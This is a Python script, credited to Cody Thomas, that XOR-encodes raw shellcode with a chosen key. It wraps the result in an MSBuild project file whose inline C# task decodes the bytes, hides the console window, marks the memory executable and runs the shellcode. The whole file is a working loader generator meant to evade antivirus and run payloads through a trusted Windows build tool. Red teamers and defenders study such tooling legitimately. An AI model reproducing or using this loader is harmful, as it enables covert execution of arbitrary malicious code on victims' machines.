# Author: Cody Thomas (https://twitter.com/its_a_feature_)
import argparse
import sys

parser = argparse.ArgumentParser(description="XOR raw shellcode with key and generate C style array and decryption routine")
parser.add_argument('--in', help='Path to file with raw shellcode', type=argparse.FileType('rb'), default=sys.stdin)
parser.add_argument('--out', help='Optional path to write output to instead of STDOUT', type=argparse.FileType('wb'), default=sys.stdout)
parser.add_argument('--str_key', help='String to use as XOR', type=str)
parser.add_argument('--hex_key', help='Hex string 4141 to use as XOR', type=str)
args = parser.parse_args()
parsed_args = vars(args)

key_array = []
output = """
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Debug">
   <ClassExample />
  </Target>
	<UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	<Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
			using System;
			using System.Reflection;
			using System.Diagnostics;
			using System.Runtime.InteropServices;
			using Microsoft.Build.Framework;
			using Microsoft.Build.Utilities;
			using System.Text;
				
			public class ClassExample :  Task, ITask
			{
				[UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
			    public delegate Int32 runD();

			    [DllImport("kernel32.dll")]
			    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
			        uint flNewProtect, out uint lpflOldProtect);

			    [DllImport("kernel32.dll")]
			    static extern IntPtr GetConsoleWindow();

			    [DllImport("user32.dll")]
			    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

			    const int SW_HIDE = 0;
			    const int SW_SHOW = 5;


				public override bool Execute()
				{
					Start();
					return true;
				}

				 private void Start()
				    { 

"""
output += "byte[] buff = new byte[] {"
if parsed_args['str_key']:
  key_array = bytearray.fromhex(parsed_args['str_key'].encode('hex'))
if parsed_args['hex_key']:
  key_array = bytearray.fromhex(parsed_args['hex_key'])

key_spot = 0
b = parsed_args['in'].read(1)
xor_array = []
while( b != ""):
  new_byte = ord(b) ^ key_array[key_spot]
  key_spot += 1
  if key_spot >= len(key_array):
    key_spot = 0
  xor_array.append(hex(new_byte))
  #parsed_args['out'].write(hex(new_byte) + ",")
  b = parsed_args['in'].read(1)
output += ",".join(xor_array)
output += "};\nbyte[] key_code = new byte[] {"
output += ",".join([hex(b) for b in key_array])
output += "};\n"

# now to add the decryption routine
output += """
int j = 0;
for(int i = 0; i < buff.Length; i++){
  buff[i] = (byte)(buff[i] ^ key_code[j]);
  j++;
  if(j >= key_code.Length){ j = 0; }
}
                        var handle = GetConsoleWindow();
				        ShowWindow(handle, SW_HIDE);

				        GCHandle pinnedArray = GCHandle.Alloc(buff, GCHandleType.Pinned);
				        IntPtr pointer = pinnedArray.AddrOfPinnedObject();
				        Marshal.Copy(buff, 0, (IntPtr)(pointer), buff.Length);
				        uint flOldProtect;
				        VirtualProtect(pointer, (UIntPtr)buff.Length, 0x40,
				            out flOldProtect);
				        runD del = (runD)Marshal.GetDelegateForFunctionPointer(pointer, typeof(runD));
				        del();
				    }
			}
							
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
"""
parsed_args['out'].write(output)
